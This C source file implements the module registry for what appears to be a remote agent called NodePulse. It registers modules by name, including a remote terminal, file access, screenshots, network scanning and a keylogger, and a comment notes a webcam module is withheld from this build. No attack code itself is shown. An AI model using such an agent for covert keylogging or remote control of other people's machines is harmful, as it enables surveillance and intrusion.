/*
 * NodePulse Agent Module Registry Implementation
 */

#include "modules.h"
#include <string.h>
#include <stdlib.h>
#include <stdio.h>

/* ============================================================================
 * Module Registry
 * ============================================================================ */

static Module* g_modules[MAX_MODULES] = {0};
static int g_module_count = 0;

int module_register(Module* mod) {
    if (!mod || g_module_count >= MAX_MODULES) return -1;
    
    /* Check for duplicate */
    for (int i = 0; i < g_module_count; i++) {
        if (strcmp(g_modules[i]->name, mod->name) == 0) {
            return -1; /* Already registered */
        }
    }
    
    g_modules[g_module_count++] = mod;
    return 0;
}

Module* module_get(const char* name) {
    if (!name) return NULL;
    
    for (int i = 0; i < g_module_count; i++) {
        if (strcmp(g_modules[i]->name, name) == 0) {
            return g_modules[i];
        }
    }
    return NULL;
}

Module** module_get_all(int* count) {
    if (count) *count = g_module_count;
    return g_modules;
}

int modules_init_all(void) {
    int failures = 0;
    
    for (int i = 0; i < g_module_count; i++) {
        Module* mod = g_modules[i];
        if (mod->init && !mod->initialized) {
            if (mod->init() == 0) {
                mod->initialized = 1;
            } else {
                failures++;
            }
        }
    }
    
    return failures;
}

void modules_cleanup_all(void) {
    for (int i = 0; i < g_module_count; i++) {
        Module* mod = g_modules[i];
        if (mod->cleanup && mod->initialized) {
            mod->cleanup();
            mod->initialized = 0;
        }
    }
}

int module_execute(const char* module_name, const char* command, 
                   const char* params, char** output) {
    Module* mod = module_get(module_name);
    if (!mod) {
        if (output) {
            *output = (char*)malloc(128);
            snprintf(*output, 128, "{\"error\":\"Module not found: %s\"}", module_name);
        }
        return -1;
    }
    
    if (!mod->execute) {
        if (output) {
            *output = (char*)malloc(128);
            snprintf(*output, 128, "{\"error\":\"Module has no execute handler: %s\"}", module_name);
        }
        return -1;
    }
    
    return mod->execute(command, params, output);
}

void modules_register_builtin(const char* enabled_modules) {
    if (!enabled_modules) return;
    
    /* Register modules based on enabled list */
    if (strstr(enabled_modules, "terminal")) {
        module_register(&mod_shell);
    }
    
    if (strstr(enabled_modules, "files")) {
        module_register(&mod_files);
    }
    
    if (strstr(enabled_modules, "screenshot")) {
        module_register(&mod_screenshot);
    }
    
    if (strstr(enabled_modules, "systemInfo")) {
        module_register(&mod_sysinfo);
    }
    
    if (strstr(enabled_modules, "networkScan")) {
        module_register(&mod_network);
    }
    
    if (strstr(enabled_modules, "keylogger")) {
        module_register(&mod_keylogger);
    }

    if (strstr(enabled_modules, "software")) {
        module_register(&mod_software);
    }

    if (strstr(enabled_modules, "services")) {
        module_register(&mod_services);
    }

    if (strstr(enabled_modules, "process")) {
        module_register(&mod_process);
    }

    if (strstr(enabled_modules, "environment")) {
        module_register(&mod_environment);
    }

    if (strstr(enabled_modules, "users")) {
        module_register(&mod_users);
    }

    if (strstr(enabled_modules, "netinfo")) {
        module_register(&mod_netinfo);
    }

    /* webcam module intentionally not registered in this build */
}
